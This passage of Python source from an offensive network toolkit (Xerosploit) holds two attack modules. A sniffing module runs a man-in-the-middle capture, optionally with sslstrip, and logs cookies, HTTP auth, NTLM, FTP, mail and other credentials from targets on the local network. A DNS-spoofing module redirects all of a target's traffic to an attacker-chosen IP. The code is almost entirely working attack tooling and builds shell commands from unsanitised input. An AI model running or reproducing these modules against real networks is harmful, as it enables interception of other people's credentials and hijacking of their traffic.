print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                           Sniffing                           █
█                                                              █
█      Capturing any data passed over your local network       █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")

						def snif():
							print("\033[1;32m\n[+] Please type 'run' to execute the 'sniff' command.\n\033[1;m")
							action_snif = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_snif == "back":
								option()
							elif action_snif == "exit":
								sys.exit(exit_msg)	
							elif action_snif == "home":
								home()
							elif action_snif == "run":
								def snif_sslstrip():

									print("\033[1;32m\n[+] Do you want to load sslstrip ? (y/n).\n\033[1;m")
									action_snif_sslstrip = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
									if action_snif_sslstrip == "y":
										print("\033[1;34m\n[++] All logs are saved on : /opt/xerosploit/xerosniff \033[1;m")
										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
										print("\033[1;34m\n[++] sslstrip : \033[1;32mON\033[0m \033[1;m")
										print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")

										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
										filename = target_ips + date
										filename = filename.replace("\n","")
										make_file = os.system("mkdir -p /opt/xerosploit/xerosniff && cd /opt/xerosploit/xerosniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /opt/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/xerosploit/xerosniff/" + filename + ".log --sniffer-output /opt/xerosploit/xerosniff/" + filename + ".pcap")
										def snifflog():
											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
											action_log = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
											if action_log == "n":
												cmd_log = os.system("rm /opt/xerosploit/xerosniff/" + filename + ".*")
												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "y":
												print("\033[1;32m\n[++] Logs have been saved. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "exit":
												sys.exit(exit_msg)


											else:
												print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
												snifflog()
										snifflog()

									elif action_snif_sslstrip == "n":
										print("\033[1;34m\n[++] All logs are saved on : /opt/xerosploit/xerosniff \033[1;m")
										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
										print("\033[1;34m\n[++] sslstrip : \033[1;91mOFF\033[0m \033[1;m")
										print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
										
										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
										filename = target_ips + date
										filename = filename.replace("\n","")
										make_file = os.system("mkdir -p /opt/xerosploit/xerosniff && cd /opt/xerosploit/xerosniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /opt/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/xerosploit/xerosniff/" + filename + ".log --sniffer-output /opt/xerosploit/xerosniff/" + filename + ".pcap")

										
										def snifflog():
											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
											action_log = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
											if action_log == "n":
												cmd_log = os.system("rm /opt/xerosploit/xerosniff/" + filename + ".*")
												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "y":
												print("\033[1;32m\n[++] Logs have been saved. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "exit":
												sys.exit(exit_msg)


											else:
												print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
												snifflog()
										snifflog()

									elif action_snif == "back":
										snif()
									elif action_snif == "exit":
										sys.exit(exit_msg)	
									elif action_snif == "home":
										home()
									else:
										print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
										snif_sslstrip()
								snif_sslstrip()
							
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								snif()

						snif()

					elif options == "dspoof":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         DNS spoofing                         █
█                                                              █
█   Supply false DNS information to all target browsed hosts   █
█     Redirect all the http traffic to the specified one IP    █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dspoof():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'dspoof' command.\n\033[1;m")
							action_dspoof = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_dspoof == "back":
								option()
							elif action_dspoof == "exit":
								sys.exit(exit_msg)	
							elif action_dspoof == "home":
								home()
							elif action_dspoof == "run":
								print("\033[1;32m\n[+] Enter the IP address where you want to redirect the traffic.\n\033[1;m")
								action_dspoof_ip = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
								dns_conf = action_dspoof_ip + " .*\.*"
								outdns = open('/opt/xerosploit/tools/files/dns.conf','w')
								outdns.write(dns_conf)
								outdns.close()

								print("\033[1;34m\n[++] Redirecting all the traffic to " + action_dspoof_ip + " ... \033[1;m")
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")

								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns /opt/xerosploit/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
								dspoof()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								dspoof()
						dspoof()
					elif options == "yplay":
						print(""" \033[1;36m
